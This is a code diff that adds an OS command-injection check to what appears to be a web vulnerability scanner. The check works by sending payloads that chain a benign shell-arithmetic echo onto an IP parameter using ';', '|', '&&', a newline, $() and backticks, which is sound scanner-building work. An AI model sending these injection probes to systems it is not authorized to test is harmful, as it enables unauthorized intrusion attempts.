@@ -392,6 +392,60 @@ def verify_error_sqli(candidate: Candidate, transport: Transport) -> Verdict:
                    f"a single quote broke a SQL string context ({sig!r}); the injected input is echoed in the database error")
 
 
+# --- OS command injection (execution-proven via shell arithmetic) -----------------------------
+_CMDI_WAF = (403, 406, 429, 451)
+
+
+def verify_cmd_injection(candidate: Candidate, transport: Transport) -> Verdict:
+    """Oracle: injected input is executed by a *nix shell. The payload echoes shell ARITHMETIC
+    (echo grin$((A*B))z) with random A,B — if executed, the body shows the COMPUTED product
+    (grin<product>z); if merely reflected, the body shows the literal expression, which never
+    contains the product. So the computed sentinel separates execution from reflection. Checked
+    regardless of status (a chained command can 500 the original while the echo still ran).
+    Scope (slice 1): sh/bash. Windows cmd/powershell and blind (use the OOB collaborator) are
+    out of scope. Probes via the attacker session when present; the payload only echoes."""
+    import random
+    loc = candidate.location
+    field = candidate.inject_field or "cmd"
+    agent = transport.by_role.get("attacker") or (
+        lambda u, method="GET", json=None: transport.request(method, u, json=json))
+    a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+    sentinel = f"grin{a * b}z"
+    arith = f"echo grin$(({a}*{b}))z"
+
+    def send(value):
+        if candidate.method.upper() == "POST":
+            return agent(candidate.url, method="POST", json={field: value})
+        return agent(_with_param(candidate.url, field, value))
+
+    try:
+        _bs, bbody = send("127.0.0.1")
+    except Exception:
+        return Verdict(INCONCLUSIVE, "command-injection", loc, "request raised an exception")
+    bbody = bbody or ""
+    if sentinel in bbody:        # astronomically unlikely; means the baseline already evaluated it
+        return Verdict(REJECTED, "command-injection", loc, "computed sentinel present without injection")
+    payloads = (f"127.0.0.1; {arith} #", f"127.0.0.1| {arith} #", f"127.0.0.1&& {arith} #",
+                f"127.0.0.1\n{arith}", f"$({arith})", f"`{arith}`")
+    reached = False
+    for value in payloads:
+        try:
+            status, pbody = send(value)
+        except Exception:
+            continue
+        if status in _CMDI_WAF:
+            return Verdict(INCONCLUSIVE, "command-injection", loc, "probe appears policy-blocked (WAF)")
+        if not status:
+            continue
+        reached = True
+        if sentinel in (pbody or "") and sentinel not in bbody:
+            return Verdict(CONFIRMED, "command-injection", loc,
+                           f"shell arithmetic executed (echo grin$(({a}*{b}))z -> {sentinel})")
+    if not reached:
+        return Verdict(INCONCLUSIVE, "command-injection", loc, "endpoint unreachable / erroring")
+    return Verdict(REJECTED, "command-injection", loc, "no payload produced shell-computed output")
+
+
 # --- SSRF (out-of-band callback) --------------------------------------------------------------
 def verify_ssrf(candidate: Candidate, transport: Transport) -> Verdict:
     """Oracle: the target makes a server-side request to grin's OOB collaborator when a callback URL
@@ -759,6 +813,7 @@ _REGISTRY: dict = {
     "jwt-weak-secret": verify_jwt_weak_secret,
     "reflected-xss": verify_reflected_xss,
     "ssrf": verify_ssrf,
+    "command-injection": verify_cmd_injection,
 }
 
 
